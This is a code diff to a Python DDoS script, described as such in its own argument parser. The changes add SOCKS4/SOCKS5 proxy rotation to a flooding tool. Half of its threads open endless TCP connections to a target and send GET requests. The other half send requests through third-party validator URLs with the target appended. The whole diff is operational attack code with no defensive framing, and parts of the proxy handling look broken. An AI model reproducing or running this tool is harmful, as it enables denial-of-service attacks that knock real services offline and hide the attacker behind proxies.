@@ -12,6 +12,7 @@ import argparse
 import signal
 import os
 from datetime import datetime
+import socks
 
 # Terminal colors
 class Colors:
@@ -48,136 +49,148 @@ def user_agent():
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6; rv:122.0) Gecko/20100101 Firefox/122.0",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile Safari/604.1",
-        "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile Safari/604.1",
-        "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
-        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
     ]
     return uagent
 
-# Validator URLs for additional pressure
+# Validator URLs
 def validators():
-    vals = [
-        "https://validator.w3.org/nu/?doc=http://",
-        "https://validator.w3.org/checklink?uri=http://",
-        "https://html5.validator.nu/?doc=http://"
+    return [
+        "http://httpbin.org/ip",
+        "http://httpbin.org/user-agent",
+        "http://httpbin.org/headers",
+        "http://www.google.com/",
+        "http://www.github.com/",
+        "http://www.stackoverflow.com/",
+        "http://www.reddit.com/",
+        "http://www.youtube.com/",
+        "http://www.facebook.com/",
+        "http://www.twitter.com/",
     ]
-    return vals
 
-def send_requests(url, uagent_list):
+# Read proxies from file
+def read_proxies(proxy_file):
+    proxies = []
     try:
-        while True:
-            user_agent = random.choice(uagent_list)
-            request = urllib.request.Request(
-                url=url,
-                headers={"User-Agent": user_agent}
-            )
+        with open(proxy_file, 'r') as f:
+            for line in f:
+                proxy = line.strip()
+                if proxy:
+                    proxies.append(proxy)
+    except FileNotFoundError:
+        print(f"{proxy_file} not found. No proxies loaded.")
+    return proxies
 
-            urllib.request.urlopen(request)
-
-            logging.info(f"{Colors.MAGENTA}sending requests...{Colors.ENDC}")
-            delay = random.uniform(0.1, 0.5)
-            time.sleep(delay)
-    except Exception as err:
-        logging.error(f"{Colors.RED}request error: {err}{Colors.ENDC}")
-        time.sleep(0.1)
-
-
-def send_packets(host, port, uagent_list, data):
+# Parse proxy string into type, host, and port
+def parse_proxy(proxy_str):
+    if proxy_str.startswith('socks4://'):
+        proxy_type = socks.SOCKS4
+        host_port = proxy_str[9:]
+    elif proxy_str.startswith('socks5://'):
+        proxy_type = socks.SOCKS5
+        host_port = proxy_str[10:]
+    else:
+        print(f"Invalid proxy format: {proxy_str}")
+        return None, None, None
     try:
-        while True:
-            packet = str("GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(uagent_list) + "\n" + data).encode('utf-8')
+        host, port = host_port.split(':', 1)
+        port = int(port)
+    except ValueError:
+        print(f"Invalid proxy format (host or port): {proxy_str}")
+        return None, None, None
+    return proxy_type, host, port
+
+def dos_thread(target, port, uagent_list, data, thread_id, proxies):
+    while True:
+        try:
+            if proxies:
+                proxy = random.choice(proxies)
+                proxy_type, proxy_host, proxy_port = parse_proxy(proxy)
+                if not all([proxy_type, proxy_host, proxy_port]):
+                    continue
+
+                socks.set_default_proxy(proxy_type, proxy_host, proxy_port)
+
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(5)
-            s.connect((host, int(port)))
-            if s.sendto(packet, (host, int(port))):
-                s.shutdown(1)
-                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                logging.info(f"{Colors.GREEN}{timestamp}{Colors.ENDC} {Colors.GREEN} <--packet sent! requesting-->{Colors.ENDC}")
-            else:
-                s.shutdown(1)
-                logging.error(f"{Colors.RED}shut<->down{Colors.ENDC}")
-            time.sleep(random.uniform(0.1, 0.5))
-    except socket.error as e:
-        logging.error(f"{Colors.RED}no connection! web server maybe down! {e}{Colors.ENDC}")
-        time.sleep(0.1)
-    except Exception as e:
-        logging.error(f"{Colors.RED}Unexpected error in send_packets: {e}{Colors.ENDC}")
-        time.sleep(0.1)
+            s.connect((target, int(port)))
+            s.sendall(data.encode())
+            s.close()
+        except Exception as e:
+            print(f"[Thread {thread_id}] Error: {e}")
 
-def dos_thread(host, port, uagent_list, data, thread_id):
+def validator_thread(validator_url, uagent_list, thread_id, proxies):
     try:
-        while True:
-            send_packets(host, port, uagent_list, data)
-    except Exception as e:
-        logging.error(f"{Colors.RED}Thread {thread_id} error: {e}{Colors.ENDC}")
+        opener = None
 
-def validator_thread(url, uagent_list, thread_id):
-    try:
-        while True:
-            send_requests(url, uagent_list)
-    except Exception as e:
-        logging.error(f"{Colors.RED}Validator thread {thread_id} error: {e}{Colors.ENDC}")
+        if proxies:
+            proxy = random.choice(proxies)
+            proxy_type, proxy_host, proxy_port = parse_proxy(proxy)
 
-# Graceful shutdown
+            if not all([proxy_type, proxy_host, proxy_port]):
+                print(f"[Thread {thread_id}] Invalid proxy format")
+                return
+
+            proxy_str = f"{proxy_type}://{proxy_host}:{proxy_port}"
+
+            proxy_handler = urllib.request.ProxyHandler({
+                "http": proxy_str,
+                "https": proxy_str
+            })
+
+            opener = urllib.request.build_opener(proxy_handler)
+        else:
+            opener = urllib.request.build_opener()
+
+        req = urllib.request.Request(validator_url)
+        req.add_header("User-Agent", random.choice(uagent_list))
+
+        with opener.open(req, timeout=10) as response:
+            response.read()
+
+    except Exception as e:
+        print(f"[Thread {thread_id}] Validator Error: {e}")
+
 def signal_handler(sig, frame):
     print(f'\n{Colors.YELLOW}Received SIGINT, shutting down gracefully...{Colors.ENDC}')
     sys.exit(0)
 
+# Main function
 def main():
-    print_banner()
-
-    # Parse arguments
-    parser = argparse.ArgumentParser()
-    parser.add_argument('target', help='Target IP or domain')
-    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default: 80)')
-    parser.add_argument('-t', '--threads', type=int, default=100, help='Number of threads (default: 100)')
-    parser.add_argument('-d', '--delay', type=float, default=0.1, help='Delay between requests (default: 0.1)')
-    parser.add_argument('--log', help='Log file path')
-    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')
-
+    parser = argparse.ArgumentParser(description="DDoS Script with optional SOCKS support.")
+    parser.add_argument("target", help="Target URL or IP address")
+    parser.add_argument("-socks4", action="store_true", help="Use SOCKS4 proxies from socks4.txt")
+    parser.add_argument("-socks5", action="store_true", help="Use SOCKS5 proxies from socks5.txt")
     args = parser.parse_args()
 
-    # Setup logging
-    log_level = logging.DEBUG if args.verbose else logging.INFO
-    if args.log:
-        logging.basicConfig(
-            level=log_level,
-            format='%(asctime)s - %(levelname)s - %(message)s',
-            handlers=[
-                logging.FileHandler(args.log),
-                logging.StreamHandler(sys.stdout)
-            ]
-        )
-    else:
-        logging.basicConfig(
-            level=log_level,
-            format='%(asctime)s - %(levelname)s - %(message)s'
-        )
+    # Load proxies
+    proxy_files = []
+    if args.socks4:
+        proxy_files.append('socks4.txt')
+    if args.socks5:
+        proxy_files.append('socks5.txt')
 
-    # Register signal handler
-    signal.signal(signal.SIGINT, signal_handler)
+    proxies = []
+    for file in proxy_files:
+        proxies.extend(read_proxies(file))
 
-    # Get target info
-    target = args.target
-    port = args.port
-    num_threads = args.threads
-
-    # Initialize components
+    # Example data and validator URLs
     uagent_list = user_agent()
     validator_list = validators()
 
-    # Load data from file if available
-    try:
-        with open('data.txt', 'r') as f:
-            data = f.read()
-    except FileNotFoundError:
-        data = "User-Agent: " + random.choice(uagent_list) + "\r\n"
+    target = args.target
+    port = 80
+    num_threads = 100
+    data = "GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n"
+
+    logging.basicConfig(
+        level=logging.INFO,
+        format='%(asctime)s - %(levelname)s - %(message)s'
+    )
+
+    # Register signal handler
+    signal.signal(signal.SIGINT, signal_handler)
 
     logging.info(f"{Colors.BLUE}Starting attack on {target}:{port} with {num_threads} threads{Colors.ENDC}")
 
@@ -186,7 +199,7 @@ def main():
 
     # Create socket threads
     for i in range(num_threads // 2):
-        t = threading.Thread(target=dos_thread, args=(target, port, uagent_list, data, i))
+        t = threading.Thread(target=dos_thread, args=(target, port, uagent_list, data, i, proxies))
         t.daemon = True
         t.start()
         threads.append(t)
@@ -194,7 +207,7 @@ def main():
     # Create validator threads
     for i in range(num_threads // 2):
         validator_url = random.choice(validator_list) + target
-        t = threading.Thread(target=validator_thread, args=(validator_url, uagent_list, i))
+        t = threading.Thread(target=validator_thread, args=(validator_url, uagent_list, i, proxies))
         t.daemon = True
         t.start()
         threads.append(t)
